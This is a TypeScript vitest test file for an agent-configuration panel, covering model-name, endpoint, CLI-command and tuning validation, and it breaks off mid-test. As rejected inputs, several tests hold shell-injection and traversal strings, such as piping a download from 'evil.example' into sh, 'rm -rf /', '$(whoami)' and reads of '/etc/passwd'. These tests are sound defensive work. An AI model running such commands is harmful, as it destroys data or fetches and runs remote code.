import { describe, expect, it } from "vitest";
import { PROVIDER_ERRORS } from "../shared/provider-request.js";
import {
  emptyConfigStatus,
  emptyTuning,
  MAX_AGENTS,
  MAX_AGENT_NAME_LENGTH,
  MAX_MODEL_LENGTH,
  type AgentCompanion,
  type AgentConfigStatus,
  type ProviderId
} from "../shared/agents.js";
import {
  agentKeySource,
  agentKeySummary,
  agentReadiness,
  agentTestRequest,
  canCreateAgent,
  canDeleteAgent,
  canSaveAgent,
  canSaveOrchestrator,
  canSaveTuning,
  canTestAgent,
  contextWindowPlaceholder,
  draftCommandPlaceholder,
  draftFrom,
  draftIsCli,
  draftModelPlaceholder,
  draftNeedsBaseUrl,
  draftNeedsModel,
  draftRole,
  draftRouteSummary,
  emptyDraft,
  emptyTuningDraft,
  isValidBaseUrl,
  isValidCommand,
  isValidContextWindow,
  isValidModel,
  isValidTemperature,
  orchestratorDraftFrom,
  orchestratorRouteSummary,
  providerName,
  providerReady,
  providerSummary,
  providerStatusFor,
  routeSummary,
  slugifyRole,
  testSummary,
  toCompanionDraft,
  toModelTuning,
  tuningChanged,
  tuningDraftFor,
  tuningDraftFrom,
  type AgentDraft,
  type OrchestratorDraft
} from "./command-center.js";

function companion(overrides: Partial<AgentCompanion> = {}): AgentCompanion {
  return {
    id: "companion-1",
    name: "Scout",
    role: "research",
    skillPaths: [],
    provider: null,
    model: null,
    baseUrl: null,
    command: null,
    tuning: emptyTuning(),
    ...overrides
  };
}

/** A config with a key stored for each named provider and for none other. */
function config(
  configured: readonly ProviderId[] = [],
  overrides: Partial<AgentConfigStatus> = {}
): AgentConfigStatus {
  const base = emptyConfigStatus();
  return {
    ...base,
    encryption: "available",
    providers: base.providers.map((provider) => ({
      ...provider,
      configured: configured.includes(provider.id)
    })),
    ...overrides
  };
}

function draft(overrides: Partial<AgentDraft> = {}): AgentDraft {
  return { ...emptyDraft(), name: "Ledger", ...overrides };
}

describe("slugifyRole", () => {
  it("turns what the user typed into an identifier the contract accepts", () => {
    expect(slugifyRole("Finance & Accounting")).toBe("finance-accounting");
    expect(slugifyRole("  Market  Research  ")).toBe("market-research");
  });

  it("leaves an already-valid slug alone", () => {
    expect(slugifyRole("research")).toBe("research");
  });

  it("yields nothing for text with no letters or digits in it", () => {
    expect(slugifyRole("——")).toBe("");
    expect(slugifyRole("")).toBe("");
  });
});

describe("draftRole", () => {
  it("prefers the role the user typed", () => {
    expect(draftRole(draft({ role: "Finance" }))).toBe("finance");
  });

  it("falls back to the name rather than refusing the save", () => {
    expect(draftRole(draft({ name: "Market Research", role: "" }))).toBe(
      "market-research"
    );
  });

  it("falls back again for a name that slugifies to nothing", () => {
    // A name in a script with no latin characters is a reason to pick a default
    // role, not a reason to block the agent from existing.
    expect(draftRole(draft({ name: "研究", role: "" }))).toBe("agent");
  });
});

describe("canSaveAgent", () => {
  it("refuses a blank name", () => {
    expect(canSaveAgent(draft({ name: "   " }))).toBe(false);
  });

  it("refuses a name past the contract bound, which the trusted side would reject", () => {
    expect(canSaveAgent(draft({ name: "x".repeat(MAX_AGENT_NAME_LENGTH + 1) }))).toBe(
      false
    );
  });

  it("treats a blank model as the provider's default rather than as an error", () => {
    expect(canSaveAgent(draft({ model: "" }))).toBe(true);
  });

  it("refuses a model the contract would reject", () => {
    expect(canSaveAgent(draft({ model: "model with spaces" }))).toBe(false);
    expect(canSaveAgent(draft({ model: "../../etc/passwd" }))).toBe(false);
  });
});

describe("isValidModel", () => {
  it("accepts the shapes real model names take", () => {
    for (const model of [
      "claude-opus-5",
      "gpt-5",
      "gemini-2.5-pro",
      "llama3.1",
      "moonshot-v1-32k",
      "qwen-max",
      // A router addresses models by vendor, so the slash has to survive.
      "anthropic/claude-opus-5"
    ]) {
      expect(isValidModel(model)).toBe(true);
    }
  });

  it("refuses traversal, empty segments, spaces, and an overlong name", () => {
    expect(isValidModel("vendor/../secret")).toBe(false);
    expect(isValidModel("vendor//model")).toBe(false);
    expect(isValidModel("/leading")).toBe(false);
    expect(isValidModel("two words")).toBe(false);
    expect(isValidModel("x".repeat(MAX_MODEL_LENGTH + 1))).toBe(false);
  });
});

describe("compatible-service drafts", () => {
  const compatible = (overrides: Partial<AgentDraft> = {}): AgentDraft =>
    draft({ provider: "openai-compatible", ...overrides });

  it("asks for an endpoint only where the endpoint is the user's to name", () => {
    expect(draftNeedsBaseUrl(compatible())).toBe(true);
    expect(draftNeedsBaseUrl(draft({ provider: "openrouter" }))).toBe(false);
    expect(draftNeedsBaseUrl(draft({ provider: null }))).toBe(false);
  });

  it("requires a model where the provider ships no default to fall back to", () => {
    expect(draftNeedsModel(compatible())).toBe(true);
    expect(draftNeedsModel(draft({ provider: "openrouter" }))).toBe(false);
  });

  it("refuses to save until both endpoint and model are named", () => {
    expect(canSaveAgent(compatible({ model: "llama-3.3" }))).toBe(false);
    expect(
      canSaveAgent(compatible({ baseUrl: "https://api.example.com/v1" }))
    ).toBe(false);
    expect(
      canSaveAgent(
        compatible({ model: "llama-3.3", baseUrl: "https://api.example.com/v1" })
      )
    ).toBe(true);
  });

  it("refuses a plaintext endpoint, which would put a key on the wire", () => {
    expect(
      canSaveAgent(compatible({ model: "llama-3.3", baseUrl: "http://api.example.com" }))
    ).toBe(false);
  });

  it("tells the user a model is required rather than leaving the box blank", () => {
    expect(draftModelPlaceholder(compatible(), config())).toContain("Required");
  });

  it("sends no endpoint for a provider that has a fixed one", () => {
    // Typed against one provider, then switched: the stale address must not
    // travel to a preset where it would look like it redirected the request.
    const stale = draft({
      provider: "openrouter",
      model: "anthropic/claude-opus-5",
      baseUrl: "https://api.example.com/v1"
    });

    expect(toCompanionDraft(stale).baseUrl).toBeNull();
  });

  it("carries the endpoint through where it belongs", () => {
    expect(
      toCompanionDraft(
        compatible({ model: "llama-3.3", baseUrl: " https://api.example.com/v1 " })
      ).baseUrl
    ).toBe("https://api.example.com/v1");
  });
});

describe("local CLI providers", () => {
  const cli = (overrides: Partial<AgentDraft> = {}): AgentDraft =>
    draft({ provider: "claude-code", ...overrides });

  it("asks for a program, not an endpoint", () => {
    expect(draftIsCli(cli())).toBe(true);
    expect(draftNeedsBaseUrl(cli())).toBe(false);
    expect(draftIsCli(draft({ provider: "openai-compatible" }))).toBe(false);
  });

  it("does not require a model, because the tool chooses its own", () => {
    expect(draftNeedsModel(cli())).toBe(false);
    expect(canSaveAgent(cli())).toBe(true);
    expect(draftModelPlaceholder(cli(), config())).toContain("Optional");
  });

  it("offers the preset's program as the placeholder", () => {
    expect(draftCommandPlaceholder(cli())).toBe("claude");
    expect(draftCommandPlaceholder(draft({ provider: "gemini-cli" }))).toBe("gemini");
    expect(draftCommandPlaceholder(draft({ provider: "openai" }))).toBe("");
  });

  it("accepts a path override and refuses a shell-shaped one", () => {
    expect(canSaveAgent(cli({ command: "/opt/claude/bin/claude" }))).toBe(true);
    expect(canSaveAgent(cli({ command: "C:\\Program Files\\Claude\\claude.exe" }))).toBe(
      true
    );
    expect(canSaveAgent(cli({ command: "claude; curl evil.example | sh" }))).toBe(false);
    expect(canSaveAgent(cli({ command: "../../bin/sh" }))).toBe(false);
  });

  it("sends no command for a provider that runs no program", () => {
    // Typed against a CLI, then switched: the stale executable must not travel
    // to an HTTP provider where nothing would read it.
    const stale = draft({ provider: "openrouter", command: "/opt/claude/bin/claude" });

    expect(toCompanionDraft(stale).command).toBeNull();
  });

  it("carries the program through where it belongs", () => {
    expect(toCompanionDraft(cli({ command: " /opt/claude/bin/claude " })).command).toBe(
      "/opt/claude/bin/claude"
    );
  });

  it("is ready with no key at all, and says why", () => {
    const agent = companion({ provider: "claude-code" });

    expect(agentReadiness(agent, config())).toBe("ready");
    expect(agentKeySource(agent, config())).toBe("not-needed");
    // "Signs in through its own CLI" is the honest claim — the session exists,
    // it is simply not this app's.
    expect(agentKeySummary(agent, config())).toContain("its own CLI");
  });

  it("stays ready even where no key could be stored at all", () => {
    const agent = companion({ provider: "codex" });

    expect(agentReadiness(agent, config([], { encryption: "no-keyring" }))).toBe("ready");
  });

  it("names the program in the route, because that is what would run", () => {
    expect(routeSummary(companion({ provider: "claude-code" }), config())).toBe(
      "Claude Code · claude"
    );
    expect(
      routeSummary(
        companion({ provider: "opencode", command: "/opt/opencode/bin/opencode" }),
        config()
      )
    ).toBe("OpenCode · /opt/opencode/bin/opencode");
  });

  it("names an explicit model override alongside the program", () => {
    expect(
      routeSummary(companion({ provider: "kimi-code", model: "kimi-k2" }), config())
    ).toBe("Kimi Code · kimi · kimi-k2");
  });
});

describe("isValidCommand", () => {
  it("accepts a program name and the paths a real install has", () => {
    expect(isValidCommand("claude")).toBe(true);
    expect(isValidCommand("/usr/local/bin/codex")).toBe(true);
    expect(isValidCommand("C:\\Program Files\\Gemini\\gemini.exe")).toBe(true);
  });

  it("refuses shell syntax, traversal, and punctuation-only names", () => {
    for (const command of [
      "claude; rm -rf /",
      "claude && curl evil.example",
      "claude | sh",
      "claude `whoami`",
      "claude $(whoami)",
      "../../bin/sh",
      "...",
      "/",
      ""
    ]) {
      expect(isValidCommand(command)).toBe(false);
    }
  });
});

describe("canSaveOrchestrator on a CLI", () => {
  it("applies with no model, since the tool picks one", () => {
    expect(
      canSaveOrchestrator(
        { provider: "claude-code", model: "", baseUrl: "", command: "", tuning: emptyTuningDraft() },
        config()
      )
    ).toBe(true);
  });

  it("refuses a program a shell would read as more than one command", () => {
    expect(
      canSaveOrchestrator(
        {
          provider: "claude-code",
          model: "",
          baseUrl: "",
          command: "claude && curl evil.example",
          tuning: emptyTuningDraft()
        },
        config()
      )
    ).toBe(false);
  });

  it("applies a change of program alone", () => {
    const saved = config([], { provider: "codex", model: "", command: "codex" });

    expect(canSaveOrchestrator(orchestratorDraftFrom(saved), saved)).toBe(false);
    expect(
      canSaveOrchestrator(
        { ...orchestratorDraftFrom(saved), command: "/opt/codex/bin/codex" },
        saved
      )
    ).toBe(true);
  });
});

describe("routeSummary with an endpoint", () => {
  it("names the host, because with a compatible service the host is the provider", () => {
    const pinned = companion({
      provider: "openai-compatible",
      model: "llama-3.3",
      baseUrl: "https://api.example.com/v1"
    });

    // Two agents both reading "OpenAI-compatible · llama-3.3" could be pointed
    // at entirely different machines.
    expect(routeSummary(pinned, config())).toBe(
      "OpenAI-compatible · llama-3.3 · api.example.com"
    );
  });
});

describe("toCompanionDraft", () => {
  it("normalises the form's empty strings back to the contract's nulls", () => {
    expect(toCompanionDraft(draft({ name: " Ledger ", role: "Finance", model: "  " }))).toEqual(
      {
        name: "Ledger",
        role: "finance",
        provider: null,
        model: null,
        baseUrl: null,
        command: null,
        tuning: emptyTuning()
      }
    );
  });

  it("carries a pinned provider and model through unchanged", () => {
    expect(
      toCompanionDraft(draft({ provider: "openai", model: " gpt-5 " }))
    ).toMatchObject({ provider: "openai", model: "gpt-5" });
  });
});

describe("draftFrom", () => {
  it("round-trips an agent into the form and back", () => {
    const pinned = companion({ provider: "openai", model: "gpt-5" });

    expect(toCompanionDraft(draftFrom(pinned))).toEqual({
      name: "Scout",
      role: "research",
      provider: "openai",
      model: "gpt-5",
      baseUrl: null,
      command: null,
      tuning: emptyTuning()
    });
  });

  it("shows an unpinned agent as following the orchestrator", () => {
    expect(draftFrom(companion()).provider).toBeNull();
  });
});

describe("providerReady", () => {
  it("is true for a local provider with no key stored", () => {
    const ollama = providerStatusFor(config(), "ollama");

    expect(ollama).not.toBeNull();
    expect(providerReady(ollama!)).toBe(true);
  });

  it("is false for a hosted provider until a key is stored", () => {
    expect(providerReady(providerStatusFor(config(), "anthropic")!)).toBe(false);
    expect(providerReady(providerStatusFor(config(["anthropic"]), "anthropic")!)).toBe(
      true
    );
  });
});

describe("providerSummary", () => {
  it("says a local provider needs no key rather than reporting one missing", () => {
    expect(providerSummary(providerStatusFor(config(), "ollama")!)).toContain(
      "no key needed"
    );
  });

  it("says a CLI signs itself in, and names the program it runs", () => {
    // Not the same claim as "no key needed": something does authenticate, it is
    // simply not this app.
    const summary = providerSummary(providerStatusFor(config(), "claude-code")!);

    expect(summary).toContain("its own CLI");
    expect(summary).toContain("claude");
  });

  it("distinguishes a stored key from a missing one", () => {
    expect(providerSummary(providerStatusFor(config(["openai"]), "openai")!)).toBe(
      "Key stored"
    );
    expect(providerSummary(providerStatusFor(config(), "openai")!)).toBe("No key stored");
  });
});

describe("providerName", () => {
  it("uses the provider's own casing", () => {
    expect(providerName("openai")).toBe("OpenAI");
    expect(providerName("anthropic")).toBe("Anthropic");
  });
});

describe("agentReadiness", () => {
  it("is ready when the pinned provider has a key", () => {
    const pinned = companion({ provider: "openai" });

    expect(agentReadiness(pinned, config(["openai"]))).toBe("ready");
  });

  it("needs a key when the pinned provider has none, even if another does", () => {
    const pinned = companion({ provider: "openai" });

    expect(agentReadiness(pinned, config(["anthropic"]))).toBe("needs-key");
  });

  it("follows the orchestrator's key state when the agent is not pinned", () => {
    expect(agentReadiness(companion(), config(["anthropic"]))).toBe("ready");
    expect(agentReadiness(companion(), config([]))).toBe("needs-key");
  });

  it("is ready against a local provider with no key at all", () => {
    const pinned = companion({ provider: "ollama" });

    expect(agentReadiness(pinned, config())).toBe("ready");
  });

  it("reports the storage refusal ahead of the missing key", () => {
    // When nothing can be stored, "needs a key" would name an action that has no
    // way to succeed.
    expect(agentReadiness(companion(), config([], { encryption: "no-keyring" }))).toBe(
      "no-encryption"
    );
  });

  it("still calls a local provider ready when nothing can be stored", () => {
    const pinned = companion({ provider: "ollama" });

    expect(agentReadiness(pinned, config([], { encryption: "unavailable" }))).toBe("ready");
  });
});

describe("routeSummary", () => {
  it("names where a pinned agent's work would go", () => {
    const pinned = companion({ provider: "openai", model: "gpt-5" });

    expect(routeSummary(pinned, config())).toBe("OpenAI · gpt-5");
  });

  it("says so when the route came from the orchestrator", () => {
    expect(routeSummary(companion(), config())).toBe(
      "Anthropic · claude-opus-5 · follows orchestrator"
    );
  });

  it("resolves a pinned provider with no model to that provider's default", () => {
    const pinned = companion({ provider: "google", model: null });

    expect(routeSummary(pinned, config())).toBe("Google · gemini-2.5-pro");
  });
});

describe("draftModelPlaceholder", () => {
  it("offers the orchestrator's model while the agent follows it", () => {
    expect(draftModelPlaceholder(draft(), config())).toBe("claude-opus-5");
  });

  it("offers the pinned provider's default once one is chosen", () => {
    expect(draftModelPlaceholder(draft({ provider: "google" }), config())).toBe(
      "gemini-2.5-pro"
    );
  });
});

describe("canSaveOrchestrator", () => {
  const orchestrator = (
    overrides: Partial<OrchestratorDraft> = {}
  ): OrchestratorDraft => ({
    provider: "anthropic",
    model: "claude-opus-5",
    baseUrl: "",
    command: "",
    tuning: emptyTuningDraft(),
    ...overrides
  });

  it("has nothing to apply when the form matches what is saved", () => {
    const saved = config();

    expect(canSaveOrchestrator(orchestratorDraftFrom(saved), saved)).toBe(false);
  });

  it("applies a provider change", () => {
    expect(
      canSaveOrchestrator(orchestrator({ provider: "openai", model: "gpt-5" }), config())
    ).toBe(true);
  });

  it("applies a model change on the same provider", () => {
    expect(canSaveOrchestrator(orchestrator({ model: "claude-sonnet-5" }), config())).toBe(
      true
    );
  });

  it("refuses a model the contract would reject", () => {
    expect(canSaveOrchestrator(orchestrator({ model: "" }), config())).toBe(false);
    expect(canSaveOrchestrator(orchestrator({ model: "a b" }), config())).toBe(false);
  });

  it("refuses a compatible endpoint until the base URL is one a key may be sent to", () => {
    const compatible = orchestrator({ provider: "openai-compatible", model: "llama-3.3" });

    expect(canSaveOrchestrator(compatible, config())).toBe(false);
    expect(
      canSaveOrchestrator({ ...compatible, baseUrl: "http://api.example.com" }, config())
    ).toBe(false);
    expect(
      canSaveOrchestrator({ ...compatible, baseUrl: "https://api.example.com/v1" }, config())
    ).toBe(true);
  });

  it("applies a change of endpoint alone", () => {
    const saved = config([], {
      provider: "openai-compatible",
      model: "llama-3.3",
      baseUrl: "https://one.example/v1"
    });

    expect(canSaveOrchestrator(orchestratorDraftFrom(saved), saved)).toBe(false);
    expect(
      canSaveOrchestrator(
        { ...orchestratorDraftFrom(saved), baseUrl: "https://two.example/v1" },
        saved
      )
    ).toBe(true);
  });
});

describe("isValidBaseUrl", () => {
  it("accepts an ordinary https endpoint", () => {
    expect(isValidBaseUrl("https://api.example.com/v1")).toBe(true);
    expect(isValidBaseUrl("https://localhost:8443")).toBe(true);
  });

  it("refuses anything that would send a key somewhere it should not go", () => {
    // Plaintext first: this URL is where an API key is sent.
    expect(isValidBaseUrl("http://api.example.com/v1")).toBe(false);
    expect(isValidBaseUrl("https://user:secret@api.example.com")).toBe(false);
    expect(isValidBaseUrl("https://api.example.com?key=leaked")).toBe(false);
    expect(isValidBaseUrl("https://api.example.com#frag")).toBe(false);
    expect(isValidBaseUrl("file:///etc/passwd")).toBe(false);
    expect(isValidBaseUrl("not a url")).toBe(false);
    expect(isValidBaseUrl("")).toBe(false);
  });
});

describe("agent keys", () => {
  const pinned = companion({ id: "companion-2", provider: "openrouter" });

  function withOwnKey(): AgentConfigStatus {
    return config([], {
      agentCredentials: [{ companionId: "companion-2", provider: "openrouter" }]
    });
  }

  it("reports which key an agent is actually using", () => {
    expect(agentKeySource(pinned, config())).toBe("none");
    expect(agentKeySource(pinned, config(["openrouter"]))).toBe("shared");
    expect(agentKeySource(pinned, withOwnKey())).toBe("own");
    expect(agentKeySource(companion({ provider: "ollama" }), config())).toBe("not-needed");
  });

  it("prefers the agent's own key over the shared one", () => {
    // Both present: the agent's own is what a request would authenticate with,
    // and the panel must not imply otherwise.
    const both = config(["openrouter"], {
      agentCredentials: [{ companionId: "companion-2", provider: "openrouter" }]
    });

    expect(agentKeySource(pinned, both)).toBe("own");
  });

  it("counts an agent's own key as making it ready with no shared key at all", () => {
    expect(agentReadiness(pinned, config())).toBe("needs-key");
    expect(agentReadiness(pinned, withOwnKey())).toBe("ready");
  });

  it("does not carry a key across a provider change", () => {
    const moved = companion({ id: "companion-2", provider: "openai" });

    expect(agentKeySource(moved, withOwnKey())).toBe("none");
  });

  it("says whose key is in force, in words the user can act on", () => {
    expect(agentKeySummary(pinned, withOwnKey())).toContain("its own");
    expect(agentKeySummary(pinned, config(["openrouter"]))).toContain("shared");
    expect(agentKeySummary(companion({ provider: "ollama" }), config())).toContain(
      "no key"
    );
  });
});

describe("roster bounds", () => {
  const roster = (count: number): readonly AgentCompanion[] =>
    Array.from({ length: count }, (_, index) => companion({ id: `companion-${index}` }));

  it("stops offering creation at the contract cap", () => {
    expect(canCreateAgent(roster(MAX_AGENTS - 1))).toBe(true);
    expect(canCreateAgent(roster(MAX_AGENTS))).toBe(false);
  });

  it("keeps the last agent, which the composer still needs", () => {
    expect(canDeleteAgent(roster(1))).toBe(false);
    expect(canDeleteAgent(roster(2))).toBe(true);
  });
});

describe("isValidContextWindow", () => {
  it("accepts an empty box, which means the provider's own", () => {
    expect(isValidContextWindow("")).toBe(true);
    expect(isValidContextWindow("   ")).toBe(true);
  });

  it("accepts a whole number of tokens inside the contract bounds", () => {
    expect(isValidContextWindow("128000")).toBe(true);
    expect(isValidContextWindow(" 8192 ")).toBe(true);
  });

  it("refuses anything that is not a plain count of tokens", () => {
    for (const text of ["12.5", "-4096", "8k", "1e6", "128,000", "0x10"]) {
      expect(isValidContextWindow(text)).toBe(false);
    }
  });

  it("refuses a number outside what the contract will store", () => {
    expect(isValidContextWindow("512")).toBe(false);
    expect(isValidContextWindow("99999999")).toBe(false);
  });
});

describe("isValidTemperature", () => {
  it("accepts an empty box, which sends no temperature at all", () => {
    expect(isValidTemperature("")).toBe(true);
  });

  it("accepts the range every provider here documents", () => {
    for (const text of ["0", "0.2", "1", "2", "1.75"]) {
      expect(isValidTemperature(text)).toBe(true);
    }
  });

  it("refuses a value outside it rather than clamping", () => {
    // Clamping would give the user a temperature they did not ask for with
    // nothing on screen saying so.
    expect(isValidTemperature("2.1")).toBe(false);
    expect(isValidTemperature("-1")).toBe(false);
  });

  it("refuses text a number input would still hand over", () => {
    for (const text of ["abc", "0.2.2", "1e0", ".5"]) {
      expect(isValidTemperature(text)).toBe(false);
    }
  });
});

describe("tuningDraftFor", () => {
  it("prefills the two settings the preset actually knows", () => {
    const filled = tuningDraftFor("anthropic");

    expect(filled.supportsImages).toBe(true);
    expect(filled.contextWindow).toBe("200000");
    // Temperature is nobody's default to guess, so the box starts empty and the
    // request carries none.
    expect(filled.temperature).toBe("");
    expect(filled.providerLabel).toBe("");
  });

  it("leaves the window empty where the preset cannot know one", () => {
    expect(tuningDraftFor("openai-compatible").contextWindow).toBe("");
    expect(tuningDraftFor("claude-code").contextWindow).toBe("");
  });

  it("says nothing at all for a route that follows the orchestrator", () => {
    expect(tuningDraftFor(null)).toEqual(emptyTuningDraft());
  });
});

describe("toModelTuning", () => {
  it("normalises empty boxes back to the contract's nulls", () => {
    expect(toModelTuning("openai", emptyTuningDraft())).toEqual({
      providerLabel: null,
      supportsImages: null,
      contextWindow: null,
      temperature: null
    });
  });

  it("keeps a name the user typed", () => {
    expect(
      toModelTuning("openai", { ...emptyTuningDraft(), providerLabel: " Team key " })
        .providerLabel
    ).toBe("Team key");
  });

  it("treats a name identical to the provider's own as no name", () => {
    // That is the placeholder left alone, not a name the user chose — storing it
    // would pin the label against a preset that may be renamed later.
    expect(
      toModelTuning("openai", { ...emptyTuningDraft(), providerLabel: "OpenAI" })
        .providerLabel
    ).toBeNull();
  });

  it("stores nothing at all for a route that follows the orchestrator", () => {
    expect(
      toModelTuning(null, {
        providerLabel: "Mine",
        supportsImages: true,
        contextWindow: "8192",
        temperature: "0.5"
      })
    ).toEqual(emptyTuning());
  });

  it("drops a value the contract would refuse rather than sending it", () => {
    const draft = { ...emptyTuningDraft(), contextWindow: "8k", temperature: "9" };

    expect(toModelTuning("openai", draft).contextWindow).toBeNull();
    expect(toModelTuning("openai", draft).temperature).toBeNull();
  });

  it("round-trips a saved setting through the form", () => {
    const saved = {
      providerLabel: "Team key",
      supportsImages: false,
      contextWindow: 8192,
      temperature: 0.2
    };

    expect(toModelTuning("openai", tuningDraftFrom(saved))).toEqual(saved);
  });
});

describe("canSaveTuning", () => {
  it("is true for settings the contract will accept", () => {
    expect(
      canSaveTuning({
        providerLabel: "Team",
        supportsImages: true,
        contextWindow: "8192",
        temperature: "0.2"
      })
    ).toBe(true);
  });

  it("is false for a number the contract would refuse", () => {
    expect(
      canSaveTuning({ ...emptyTuningDraft(), temperature: "3" })
    ).toBe(false);
    expect(
      canSaveTuning({ ...emptyTuningDraft(), contextWindow: "-1" })
    ).toBe(false);
  });
});

describe("tuningChanged", () => {
  it("reads a differently written number as the same setting", () => {
    // Otherwise Apply stays lit after a save and invites the user to wonder
    // whether it landed.
    expect(
      tuningChanged("openai", { ...emptyTuningDraft(), temperature: "0.20" }, {
        providerLabel: null,
        supportsImages: null,
        contextWindow: null,
        temperature: 0.2
      })
    ).toBe(false);
  });

  it("notices a setting that actually moved", () => {
    expect(
      tuningChanged("openai", { ...emptyTuningDraft(), temperature: "0.4" }, emptyTuning())
    ).toBe(true);
  });
});

describe("canSaveAgent with model settings", () => {
  it("refuses a draft whose settings the contract would reject", () => {
    expect(
      canSaveAgent(
        draft({
          provider: "openai",
          model: "gpt-5",
          tuning: { ...emptyTuningDraft(), temperature: "7" }
        })
      )
    ).toBe(false);
  });

  it("still accepts one whose settings are simply unstated", () => {
    expect(canSaveAgent(draft({ provider: "openai", model: "gpt-5" }))).toBe(true);
  });
});

describe("contextWindowPlaceholder", () => {
  it("offers the preset's number where there is one", () => {
    expect(contextWindowPlaceholder("anthropic")).toBe("200000");
  });

  it("admits it does not know rather than inventing a figure", () => {
    expect(contextWindowPlaceholder("openai-compatible")).toBe(
      "Optional — the model's window in tokens"
    );
  });

  it("says who is managing the context for a CLI", () => {
    expect(contextWindowPlaceholder("claude-code")).toBe("Managed by the CLI");
  });

  it("points at the orchestrator for a route that follows it", () => {
    expect(contextWindowPlaceholder(null)).toBe("Follows the orchestrator");
  });
});

describe("canTestAgent", () => {
  it("refuses a route that names no provider", () => {
    // A test of "follows the orchestrator" would be a test of a different route
    // than the one on screen.
    expect(canTestAgent(draft({ provider: null }))).toBe(false);
  });

  it("refuses a configuration that could not be saved either", () => {
    expect(canTestAgent(draft({ provider: "openai-compatible", model: "" }))).toBe(false);
  });

  it("accepts one that is complete", () => {
    expect(
      canTestAgent(
        draft({
          provider: "openai-compatible",
          model: "llama-3.3",
          baseUrl: "https://api.example.com/v1"
        })
      )
    ).toBe(true);
  });
});

describe("agentTestRequest", () => {
  it("sends the route the form is showing, not the one that is saved", () => {
    expect(
      agentTestRequest(
        draft({
          provider: "openai-compatible",
          model: " llama-3.3 ",
          baseUrl: " https://api.example.com/v1 ",
          tuning: { ...emptyTuningDraft(), temperature: "0.3" }
        }),
        "companion-1"
      )
    ).toEqual({
      provider: "openai-compatible",
      model: "llama-3.3",
      baseUrl: "https://api.example.com/v1",
      command: null,
      tuning: {
        providerLabel: null,
        supportsImages: null,
        contextWindow: null,
        temperature: 0.3
      },
      companionId: "companion-1"
    });
  });

  it("drops an endpoint the provider does not take, exactly as a save does", () => {
    expect(
      agentTestRequest(
        draft({ provider: "openai", model: "gpt-5", baseUrl: "https://evil.example" }),
        null
      )?.baseUrl
    ).toBeNull();
  });

  it("has nothing to send for a route that follows the orchestrator", () => {
    expect(agentTestRequest(draft({ provider: null }), null)).toBeNull();
  });

  it("carries no field a credential could travel in", () => {
    const request = agentTestRequest(draft({ provider: "openai", model: "gpt-5" }), null);

    expect(request).not.toBeNull();
    expect(Object.keys(request ?? {})).toEqual([
      "provider",
      "model",
      "baseUrl",
      "command",
      "tuning",
      "companionId"
    ]);
  });
});

describe("testSummary", () => {
  it("says nothing before anything has been tried", () => {
    expect(testSummary({ kind: "idle" })).toBeNull();
  });

  it("distinguishes not tried from tried and clean", () => {
    expect(testSummary({ kind: "passed", elapsedMs: 412 })).toContain("412 ms");
  });

  it("never rounds a fast answer down to nothing", () => {
    expect(testSummary({ kind: "passed", elapsedMs: 0 })).toContain("1 ms");
  });

  it("has wording of its own for every failure the transport can report", () => {
    for (const code of PROVIDER_ERRORS) {
      const line = testSummary({ kind: "failed", code });
      expect(line).not.toBeNull();
      expect((line ?? "").length).toBeGreaterThan(0);
    }
  });
});

describe("draftRouteSummary", () => {
  it("describes the route being edited rather than the one that is saved", () => {
    expect(
      draftRouteSummary(
        draft({ provider: "openai", model: "gpt-4.1" }),
        config()
      )
    ).toBe("OpenAI · gpt-4.1");
  });

  it("uses the name the user gave this configuration", () => {
    expect(
      draftRouteSummary(
        draft({
          provider: "openai-compatible",
          model: "llama-3.3",
          baseUrl: "https://api.example.com/v1",
          tuning: { ...emptyTuningDraft(), providerLabel: "Lab box" }
        }),
        config()
      )
    ).toBe("Lab box · llama-3.3 · api.example.com");
  });

  it("names the program for a CLI route, because that is what would run", () => {
    expect(draftRouteSummary(draft({ provider: "claude-code" }), config())).toBe(
      "Claude Code · claude"
    );
  });

  it("says it follows the orchestrator once, not twice", () => {
    /*
     * `routeSummary(null, config)` resolves through the inherit path and ends in
     * "follows orchestrator". Prefixing that produced a line that opened and
     * closed with the same fact.
     */
    const line = draftRouteSummary(draft({ provider: null }), config());

    expect(line).toBe("Follows the orchestrator · Anthropic · claude-opus-5");
    expect(line.toLowerCase().match(/orchestrator/gu)).toHaveLength(1);
  });
});

describe("routeSummary and the name a configuration was given", () => {
  it("tells two routes of the same type apart in the roster", () => {
    /*
     * The exact confusion the Provider Name field exists to prevent: two agents
     * pointed at different machines both reading "OpenAI-compatible". The roster
     * is where they are read side by side, so it is where the name has to show.
     */
    const lab = companion({
      provider: "openai-compatible",
      model: "llama-3.3",
      baseUrl: "https://lab.internal/v1",
      tuning: { ...emptyTuning(), providerLabel: "Lab box" }
    });
    const prod = companion({
      id: "companion-2",
      provider: "openai-compatible",
      model: "llama-3.3",
      baseUrl: "https://prod.internal/v1",
      tuning: { ...emptyTuning(), providerLabel: "Prod box" }
    });

    expect(routeSummary(lab, config())).toBe("Lab box · llama-3.3 · lab.internal");
    expect(routeSummary(prod, config())).toBe("Prod box · llama-3.3 · prod.internal");
  });

  it("falls back to the provider's own name when none was given", () => {
    expect(routeSummary(companion({ provider: "openai", model: "gpt-5" }), config())).toBe(
      "OpenAI · gpt-5"
    );
  });

  it("carries the name onto a CLI route too", () => {
    expect(
      routeSummary(
        companion({
          provider: "claude-code",
          tuning: { ...emptyTuning(), providerLabel: "Work CLI" }
        }),
        config()
      )
    ).toBe("Work CLI · claude");
  });

  it("shows an inherited route under the orchestrator's name, not the agent's", () => {
    // An unpinned agent stores no settings of its own, so the name it displays
    // is the one the orchestrator is configured under.
    const saved = config([], {
      tuning: { ...emptyTuning(), providerLabel: "Work account" }
    });

    expect(routeSummary(companion({ provider: null }), saved)).toBe(
      "Work account · claude-opus-5 · follows orchestrator"
    );
  });
});

describe("orchestratorRouteSummary", () => {
  it("never says the orchestrator follows anything", () => {
    // It is the thing being followed, so the suffix `routeSummary` adds for an
    // inherited route is nonsense on its own row.
    expect(orchestratorRouteSummary(config())).toBe("Anthropic · claude-opus-5");
    expect(routeSummary(null, config())).toContain("follows orchestrator");
  });

  it("names the program when the orchestrator is on a CLI", () => {
    expect(
      orchestratorRouteSummary(
        config([], { provider: "claude-code", model: "", command: null })
      )
    ).toBe("Claude Code · claude");
  });

  it("uses the name the user gave the configuration", () => {
    expect(
      orchestratorRouteSummary(
        config([], { tuning: { ...emptyTuning(), providerLabel: "Work account" } })
      )
    ).toBe("Work account · claude-opus-5");
  });

  it("says so plainly when no model is set", () => {
    expect(orchestratorRouteSummary(config([], { model: "" }))).toBe(
      "Anthropic · no model set"
    );
  });
});

describe("testSummary on a CLI route", () => {
  const cli = { isCli: true, command: "claude" };

  it("never claims a provider answered, because none was called", () => {
